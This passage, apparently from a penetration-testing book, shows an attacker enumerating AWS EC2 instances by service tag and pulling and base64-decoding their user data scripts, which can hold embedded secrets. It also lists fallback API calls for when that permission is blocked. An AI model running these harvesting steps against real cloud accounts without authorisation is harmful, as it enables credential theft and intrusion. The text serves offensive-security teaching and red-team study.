- pgno: 197
  md: "We store these service names as keywords in a file and then feed them to a\
    \ loop that retrieves the instances bearing a tag name matching the keyword, as\
    \ shown next. We extract the first instance ID of every pool of machines belonging\
    \ to the same service since, for example, all Cassandra machines will probably\
    \ share the same user data, so we only need one instance:\n\n```\nroot@Point1:~/#\
    \ while read p; do\n  instanceID=$(aws ec2 describe-instances \\\n  --filter \"\
    Name=tag:Name,Values=*\\$p*\" \\\n  --query 'Reservations[0].Instances[].InstanceId'\
    \ \\\n  --region=eu-west-1 \\\n  --output=text)\n  echo $instanceID > list_ids.txt\n\
    done <services.txt\n```\n\nThis rather improvised sampling method gives us about\
    \ 20 instance IDs, each referring to a machine hosting a different service:\n\n\
    ```\nroot@Point1:~/# head list_ids.txt\ni-08072939411515dac\ni-080746959025ceae\n\
    i-91263120217ecdef\n--snip--\n```\n\nWe loop through this file calling the ec2\
    \ describe-instance-attribute API to fetch the user data, decode it, and store\
    \ it in a file:\n\n```\nroot@Point1:~/# while read p; do\nuserData=$(aws ec2 describe-instance-attribute\
    \ \\\n  --instance-id $p \\\n  --attribute userData \\\n  --region=eu-west-1 \\\
    \n  | jq -r .UserData.Value | base64 -d)\necho $userData > $p.txt\ndone <list_ids.txt\n\
    ```\n\n> NOTE The describe-instance-attribute API call is often granted without\
    \ so much as a second thought through a describe* policy. If it's blocked, we\
    \ can attempt to grab the launch configuration of an auto-scaling group, which\
    \ usually holds the same data: aws autoscaling describe-launch-configurations\
    \ or aws ec2 describe-launch-templates.\n\nWe check to see how many files were\
    \ created and confirm the files contain user data scripts:\n\n```\nroot@Point1:~/#\
    \ ls -l i-*.txt | wc -l\n21\nroot@Point1:~/# cat i-08072939411515dac.txt\n```"
